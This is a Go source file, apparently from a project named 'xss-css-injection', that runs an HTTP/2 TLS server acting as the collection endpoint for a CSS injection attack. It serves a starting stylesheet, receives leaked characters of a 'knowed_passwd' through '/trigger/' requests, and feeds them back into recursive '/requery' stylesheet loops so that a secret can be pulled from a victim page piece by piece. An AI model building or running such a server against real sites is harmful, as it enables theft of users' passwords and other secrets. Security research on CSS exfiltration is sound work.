package server

import (
	"fmt"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"

	"golang.org/x/net/http2"
)

func RunHttpServer(conf_path string) {

	conf := Parse_conf(conf_path)
	// conf := Parse_conf("/home/debian/main/xss-css-injection/conf.yml")

	server := &http.Server{
		Addr: ":" + conf.Port,
	}
	http2.ConfigureServer(server, &http2.Server{})

	fmt.Println("Server started and listen on " + conf.IPAddr + ":" + conf.Port)
	chl := make(chan string)
	http.HandleFunc("/", func(writer http.ResponseWriter, request *http.Request) {
		catch(writer, request, chl, conf)
	})
	server.ListenAndServeTLS(conf.Crt_path, conf.Key_path)
	// server.ListenAndServe()
}

func catch(writer http.ResponseWriter, request *http.Request, chl chan string, conf Conf) {
	n_loop := &Loop_n
	switch {
	case strings.Contains(request.URL.String(), "/start.css"):
		*n_loop = 0
		Loop(writer, "", *n_loop, conf.IPAddr, conf.Port)
	case strings.Contains(request.URL.String(), "/trigger/"):
		knowed_passwd := filepath.Base(request.URL.String())
		fmt.Println("Send " + knowed_passwd + " through channel")
		chl <- knowed_passwd
		SendRequest(writer, "")
	case strings.Contains(request.URL.String(), "/requery"):
		*n_loop = *n_loop + 1
		fmt.Println("Nombre de boucle: " + strconv.Itoa(*n_loop))
		fmt.Println("Wait knowed payload")
		knowed_passwd := <-chl
		Loop(writer, knowed_passwd, *n_loop, conf.IPAddr, conf.Port)
	default:
		fmt.Println(request.URL.String())
		fmt.Println("default")
	}
}
